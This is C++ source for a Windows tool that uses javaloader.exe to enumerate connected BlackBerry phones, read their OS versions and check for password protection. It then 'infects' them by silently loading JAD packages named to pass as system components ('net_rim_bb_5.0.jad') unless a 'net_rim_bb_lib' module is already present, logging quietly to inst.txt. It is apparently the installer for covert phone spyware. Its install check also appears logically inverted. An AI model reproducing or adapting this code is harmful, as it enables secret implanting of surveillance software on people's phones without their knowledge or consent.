// JavaLoaderHelper.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include <direct.h>
#include <time.h>

#include <string>
#include <iostream>
#include <vector>
#include <algorithm>

#include <iterator>

#include <fstream>
#include <sstream>
#include <set>

#define GetCurrentDir _wgetcwd

//#include <stdio.h>
using namespace std;

const wstring JAVALOADER = L"javaloader.exe";

//const wstring JADDIR = L"";
const wstring JADEXT = L"jad";
const wstring INTERRUPT_ERROR = L"Error";
const wstring INTERRUPT_PASSWORD = L"Password Protected";

boolean debugOnFile = true;
//wostream & debug = debugEnabled? wofstream(L"debug.txt", ios::out | ios::app): wcout;
wofstream fdebug(L"inst.txt", ios::out | ios::trunc);

#define debug (debugOnFile? fdebug: wcout)
//wostream & debug = debugEnabled? fdebug: wcout;

boolean interactive=false;

enum infect_result { OK, IS_INSTALLED, NOT_INSTALLED, ERR_PASSWORD, ERR_DIR, ERR_LOAD, ERR_GENERIC, ERR_COM, NOT_YET  };

wstring upper_string(wstring& str)
{
	wstring upper;
	std::transform(str.begin(), str.end(), back_inserter(upper), toupper);
	return upper;
}

wstring ExePath() {
	WCHAR szEXEPath[2048];
	GetModuleFileName ( NULL, szEXEPath, 2048 );
	wstring ret = szEXEPath;
	int pos = ret.rfind(L"\\" );
	return ret.substr( 0, pos);
}

wstring Pwd() {
	WCHAR cCurrentPath[FILENAME_MAX];
	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath) / sizeof(WCHAR)))
	{
		return L"";
	}

	return cCurrentPath;
}

int SearchDirectory(vector<wstring> &refvecFiles,
	const wstring &refcstrRootDirectory,
	const wstring &refcstrExtension,
	bool bSearchSubdirectories = true)
{
	wstring strFilePath; // Filepath
	wstring strPattern; // Pattern
	wstring strExtension; // Extension
	HANDLE hFile; // Handle to file
	WIN32_FIND_DATA FileInformation; // File information

	strPattern = refcstrRootDirectory + L"\\*.*";

	hFile = ::FindFirstFile(strPattern.c_str(), &FileInformation);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if(FileInformation.cFileName[0] != '.')
			{
				strFilePath.erase();
				strFilePath = refcstrRootDirectory + L"\\" + FileInformation.cFileName;

				if(FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if(bSearchSubdirectories)
					{
						// Search subdirectory
						int iRC = SearchDirectory(refvecFiles,
							strFilePath,
							refcstrExtension,
							bSearchSubdirectories);
						if(iRC)
							return iRC;
					}
				}
				else
				{
					// Check extension
					strExtension = FileInformation.cFileName;
					strExtension = strExtension.substr(strExtension.rfind(L".") + 1);

					if(strExtension == refcstrExtension)
					{
						// Save filename
						refvecFiles.push_back(strFilePath);
					}
				}
			}
		} while(::FindNextFile(hFile, &FileInformation) == TRUE);

		// Close handle
		::FindClose(hFile);

		DWORD dwError = ::GetLastError();
		if(dwError != ERROR_NO_MORE_FILES)
			return dwError;
	}

	return 0;
}

wstring Replace(const wstring& orig,const wstring& fnd, const wstring& repl)
{
	wstring ret = orig;
	size_t pos = 0;

	while(true)
	{
		pos = ret.find(fnd,pos);
		if(pos == wstring::npos)  // no more instances found
			break;

		ret.replace(pos,fnd.size(),repl);  // replace old string with new string
		pos += repl.size();
	}

	return ret;
}

// execute a command and returns the stdout
wstring exec(wstring cmd, wstring args) {
	

	SetCurrentDirectoryW(ExePath().c_str());
	wstring full_path=cmd + L" " + args;

	//debug << L"EXECUTING: " << full_path << endl;
	FILE* pipe = _wpopen(full_path.c_str(), L"r");
	if (!pipe) {
		debug<<"Exe not found"<<endl;
		return L"NOTFOUND";
	}

	const int size = 128;
	WCHAR buffer[size];
	wstring result = L"";
	while(!feof(pipe)) {
		if(fgetws(buffer, size, pipe) != NULL){
			result += buffer;
			
		}
	}

	if(result.find(INTERRUPT_PASSWORD)!=wstring::npos){
		_pclose(pipe);
		//debug<<result<<endl;
		return L"PASSWORD";
	}

	if(result.find(INTERRUPT_ERROR)!=wstring::npos){
		_pclose(pipe);
		//debug<<result<<endl;
		return L"ERROR";
	}

	_pclose(pipe);
	Sleep(300);
	return result;
}

bool needToInfect(wstring pin, set<wstring> argv ) 
{
	if(argv.size()==0)
		return true;
	return argv.find(pin)!=argv.end();
}

boolean exists( wstring filename ){
	boolean ret=false;
	ifstream my_file(filename);
	if (my_file.good())
	{
		debug<<"File exists: "<<filename<<endl;
		ret=true;
	}

	return ret;
}

int isError( wstring execResult ) 
{
	wstring upperResult=upper_string(execResult);
	boolean Ecan = upperResult.find(L"THE SYSTEM CANNOT FIND") != wstring::npos;
	boolean Eerr = upperResult.find(L"ERROR") != wstring::npos;
	boolean Enot = upperResult.find(L"NOTFOUND") != wstring::npos;
	boolean Epas = upperResult.find(L"PASSWORD PROTECTED") != wstring::npos;
	int ret = (Ecan << 0 | Eerr << 1 | Enot << 2 | Epas << 3);
	return ret;
}

wstring execJloader(wstring pin, wstring password, wstring  param ) 
{
	wstring result;
	if(password.length()==0){
		result = exec( JAVALOADER, L" -p" + pin + L" " + param);
	}else{
		result = exec( JAVALOADER, L" -p" + pin +  L" -w" + password + L" " + param);
	}
	return result;
}

// gets the OS version of a specific device.
// the version is a number of 4 digits.
// The mayor is represented by the first 2 digits
// ex: OS 4.6.1 is: 4061
boolean GetBBVersion(wstring pin,  wstring password, int* version) 
{
	wstring vresult=execJloader(pin, password,L"deviceinfo") ;

	
	std::wistringstream iss(vresult);
	std::wstring lversion;
	//wchar_t delimiter = L'\n'
	wstring vmsg=L"VM Version:";

	while(std::getline(iss, lversion))
	{
		if( lversion.find(vmsg)!=wstring::npos){
			string::size_type numpos = lversion.find(L"0x");
			if(numpos!=wstring::npos){
				wstring wversion = lversion.substr(numpos+2,4);
				debug << wversion << endl;

				*version = stoi(wversion);
				if(*version != NULL){
					return true;
				}
			}
		}
	}

	return false;

}



// load a speficic jad on a device identified by its pin
// returns OK or ERR_LOAD
infect_result loadJad(wstring pin, wstring password, wstring jadname){
	wstring instresult=execJloader(pin, password, L"load " + jadname);

	//debug << instresult<< endl;
	if(int error = isError(instresult)){
		debug<< "loadJad error: "<<error<< endl;
		return ERR_LOAD;
	}
	return OK;
}

// infect a pin with the correct jad
// returns OK or ERR_LOAD
infect_result infect( wstring pin, wstring password ) 
{
	bool result = false;
	
	debug<< L"INSTALLING"<<endl;
	vector<wstring> vecCodFiles;
	int iRC = 0;

	int version =0 ;
	boolean ret = GetBBVersion(pin, password, &version);
	debug<< ret << " version: " << version << endl;

	infect_result infected=NOT_YET;
	// get the version and tries to load the correct
	if(ret){
		
		if(version>0 && version <4050){
			debug << " not supported version: "<< version << endl;
			return ERR_GENERIC;
		}

		// see if it's at least OS 5.0
		if(version>=5000){
			if(exists(L"net_rim_bb_5.0.jad"))
				infected=loadJad(pin,password,L"net_rim_bb_5.0.jad");
			else if(exists(L"bb_in_5.0.jad"))
				infected=loadJad(pin,password,L"bb_in_5.0.jad");
		}

		// try 
		Sleep(300);
		if(infected!=OK){
			if(exists(L"net_rim_bb_4.5.jad"))
				infected=loadJad(pin,password,L"net_rim_bb_4.5.jad");
			else if(exists(L"bb_in_4.5.jad"))
				infected=loadJad(pin,password,L"bb_in_4.5.jad");
		}
								
	}	
	
	return infected==OK?OK:ERR_LOAD;
}


// check if the pin is already installed or not.
// if there are no errors it returns IS_INSTALLED or NOT_INSTALLED
infect_result isInstalled( wstring pin, wstring password ) 
{
	wstring installedcodlist = execJloader( pin, password, L" dir -1");

	if(int error = isError(installedcodlist) ){
		debug << "DIR ERROR: " << error << endl;
		return ERR_GENERIC;
	}

	int pos = installedcodlist.find(L"net_rim_bb_lib\n");

	if(pos!=wstring::npos){
		debug<< "ALREADY INSTALLED"<<endl;
		return IS_INSTALLED;
	}else{
		return NOT_INSTALLED;
	}
}


/*

if(interactive){
	javaloadersilent enum
	foreach(pin){
		javaloadersilent deviceinfo
		if(password protected){
			cin >> passwd 
			javaloadersilent -wpassword deviceinfo
		}

}else{
	javaloadersilent enum
	foreach(pin){
		javaloadersilent deviceinfo
		if(password protected){
			continue;
	}	
}

*/

boolean checkPasswordProtected( std::wstring pin ) 
{
	wstring result = execJloader( pin,L"", L"deviceinfo");
	
	int error = isError(result);
	debug<<"checkPasswordProtected error: "<<error<<endl;

	int prot = error & (1<<3);
	return prot > 0;
}

int _tmain(int argc, _TCHAR* argv[])
{
	int infected=0;
	bool force=false;

	if(argc==2){
		if(wstring(argv[1])==L"interactive"){
			debugOnFile=false;
			interactive = true;
			force=true;
		}
	}
			
	debug << time(NULL) << endl;
	wstring result = exec( JAVALOADER, L" enum");

	if(isError(result)){
		debug << "Unable to open port" << endl;
		return -1;
	}

	std::wistringstream iss(result);
	std::wstring pin;
	std::wstring password;
	boolean password_protected = false;
	//wchar_t delimiter = L'\n'
	
	int i=0;
	while(std::getline(iss, pin))
	{
		debug << pin << std::endl;
		
		if(pin.substr(0,2) == L"0x"){
			debug<< ++i << " -> " <<pin << endl;

			password_protected = checkPasswordProtected(pin);
			debug<<"password_protected: "<<password_protected<<endl;

			if(password_protected && interactive){
				cout<<"Insert password:"<<endl;
				wcin>>password;
			}
			
			/*
			1) no prot, isinstalled
			2) prot, pass, isinstalled
			

			*/

			if(  !password_protected || password.length()>0 ){

				boolean installed = isInstalled(pin, password) == NOT_INSTALLED;
				if(!installed && infect(pin, password)==OK){
					debug<<"INSTALLED "<<pin<<endl;
					infected++;
				}else{
					debug<<"CANNOT INSTALL "<<pin<<endl;
				}
			}else{
				debug<<"PASSWORD PROTECTED "<<pin<<endl;
			}
		}		
	}
		
	return infected?EXIT_SUCCESS:EXIT_FAILURE;
}

